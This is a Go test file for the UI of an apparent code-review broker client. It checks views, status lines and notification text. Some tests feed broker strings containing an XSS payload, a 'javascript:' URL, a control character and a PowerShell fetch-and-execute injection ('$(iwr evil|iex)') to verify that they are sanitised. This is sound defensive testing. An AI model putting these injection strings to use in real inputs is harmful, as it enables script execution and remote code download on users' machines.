package main

import (
	"strings"
	"testing"
	"time"

	"github.com/goldquality/cross-review/internal/client"
	"github.com/goldquality/cross-review/internal/mrurl"
)

func TestTeamViews(t *testing.T) {
	team := client.Team{
		Online: []client.Teammate{{Name: "аня", State: "busy"}, {Name: "Georgiy", State: "free"}, {Name: "Маша", State: "paused"}},
		Top:    []client.Teammate{{Name: "Петя", Balance: 7}, {Name: "Georgiy", Balance: 3}},
	}
	online, top := teamViews(team, "georgiy")
	want := []MemberView{{Name: "аня", State: "ревьюит"}, {Name: "Georgiy", State: "свободен", Me: true}, {Name: "Маша", State: "пауза"}}
	if len(online) != 3 || online[0] != want[0] || online[1] != want[1] || online[2] != want[2] {
		t.Fatalf("онлайн: %+v", online)
	}
	if len(top) != 2 || top[0] != (MemberView{Name: "Петя", Balance: 7}) || !top[1].Me {
		t.Fatalf("топ: %+v", top)
	}
}

// Строки брокера уходят в окно почищенными: без управляющих символов и разметки.
func TestBuildViewCleansBrokerText(t *testing.T) {
	evil := "Аня‮\n<img src=x onerror=alert(1)>$(iwr evil|iex)"
	st := client.State{
		Configured: true, Online: true, Name: "georgiy", Balance: 3,
		Current: &client.Running{Short: "shop!9", Requester: evil, Started: time.Now()},
		Team:    client.Team{Online: []client.Teammate{{Name: evil, State: "free"}}, Top: []client.Teammate{{Name: evil, Balance: 1}}},
	}
	v := buildView(st, nil, false)
	for _, s := range []string{v.Current.Requester, v.Team[0].Name, v.Top[0].Name} {
		if strings.ContainsAny(s, "<>$\n‮") {
			t.Errorf("не почищено: %q", s)
		}
	}
	st.LastError = evil
	if s := statusLine(st); strings.ContainsAny(s, "<>$\n‮") {
		t.Errorf("строка состояния: %q", s)
	}
}

func TestStatusLine(t *testing.T) {
	paused := time.Date(2026, 1, 2, 15, 4, 0, 0, time.Local)
	for _, c := range []struct {
		st   client.State
		want string
	}{
		{client.State{SettingsErr: "projects: нет ни одного репо"}, "Ошибка в настройках: projects: нет ни одного репо"},
		{client.State{LastError: "в настройках нет invite"}, "в настройках нет invite"},
		{client.State{}, "Подключаюсь к брокеру…"},
		{client.State{Configured: true, LastError: "timeout"}, "Нет связи: timeout"},
		{client.State{Configured: true, Online: true, Current: &client.Running{Short: "shop!9"}}, "ревьюю shop!9"},
		{client.State{Configured: true, Online: true, PausedUntil: paused}, "пауза до 15:04 — задания не приходят"},
		{client.State{Configured: true, Online: true}, "онлайн, жду заданий"},
		{client.State{Configured: true}, "подключаюсь…"},
	} {
		if got := statusLine(c.st); got != c.want {
			t.Errorf("%+v: %q, а не %q", c.st, got, c.want)
		}
	}
}

func TestBuildViewTeamOnlyOnline(t *testing.T) {
	st := client.State{Configured: true, Team: client.Team{Top: []client.Teammate{{Name: "аня"}}}}
	if v := buildView(st, nil, false); v.Top != nil {
		t.Fatal("без связи команда устарела бы молча")
	}
	st.Online = true
	if v := buildView(st, nil, false); len(v.Top) != 1 {
		t.Fatal(v.Top)
	}
}

func TestBuildViewProjects(t *testing.T) {
	st := client.State{Ignored: []string{"gitlab.example.com/acme/web"}}
	v := buildView(st, []client.Project{{Repo: "gitlab.example.com/acme/api"}, {Repo: "gitlab.example.com/acme/web"}}, true)
	if len(v.Projects) != 2 || v.Projects[0].Ignored || !v.Projects[1].Ignored || !v.Autostart {
		t.Fatalf("%+v", v)
	}
}

func TestRequestViews(t *testing.T) {
	r := client.RequestInfo{MRURL: "https://gitlab.example.com/acme/shop/-/merge_requests/9", CreatedAt: time.Date(2026, 1, 2, 15, 4, 0, 0, time.Local).Unix(), Status: "open"}
	r.Jobs = append(r.Jobs, struct {
		Reviewer string `json:"reviewer"`
		Status   string `json:"status"`
	}{"<b>аня</b>", "running"}, struct {
		Reviewer string `json:"reviewer"`
		Status   string `json:"status"`
	}{"", "pending"})
	bad := client.RequestInfo{MRURL: "javascript:<script>", Status: "done"}
	got := requestViews([]client.RequestInfo{r, bad})
	if got[0] != (RequestView{When: "02.01 15:04", Short: "shop!9", Status: "идёт", Open: true, Jobs: "‹b›аня‹/b›: ревьюит; ждёт ревьюера: ждёт"}) {
		t.Errorf("%+v", got[0])
	}
	if strings.ContainsAny(got[1].Short, "<>") || got[1].Status != "закрыт" {
		t.Errorf("%+v", got[1])
	}
}

func TestOfferText(t *testing.T) {
	mr, err := mrurl.ParseMR("https://gitlab.example.com/acme/shop/-/merge_requests/9")
	if err != nil {
		t.Fatal(err)
	}
	until := time.Date(2026, 1, 2, 15, 4, 0, 0, time.Local)
	// Имя просящего пришло от брокера: в тост оно попадает почищенным.
	l := offerText(client.JobOffer{MR: mr, Requester: "Аня\n$(iwr evil|iex)", Command: "./dev review <LINK>", Workdir: "/srv/devtools", Until: until})
	if l.who != "Аня (iwr evil|iex) просит отревьюить shop!9" {
		t.Errorf("who: %q", l.who)
	}
	// Команда и папка — из настроек участника, их не чистят: <LINK> остаётся как есть.
	if l.run != "Принять — запущу ./dev review <LINK>\nв /srv/devtools" {
		t.Errorf("run: %q", l.run)
	}
	if l.until != "Не ответишь до 15:04 — задание уйдёт другому" || l.title != "Запрос на ревью" {
		t.Errorf("%+v", l)
	}
}

func TestToasterActions(t *testing.T) {
	// Без окна: проверяем только очередь ответов и закрытие по клику.
	tt := &toaster{calls: map[string]int{}}
	ts := &toast{id: 1, spec: toastSpec{Buttons: []string{"a", "b"}}, answers: make(chan int, 8)}
	tt.list = []*toast{ts}
	tt.action(1, 5) // нет такой кнопки
	tt.action(1, -1)
	tt.action(1, 1)
	select {
	case a := <-ts.answers:
		if a != 1 {
			t.Fatal(a)
		}
	default:
		t.Fatal("ответ не пришёл")
	}
	if len(ts.answers) != 0 {
		t.Fatal("лишние ответы")
	}
	if v := tt.views(); len(v) != 1 || v[0].Total != 0 {
		t.Fatalf("%+v", v)
	}
}
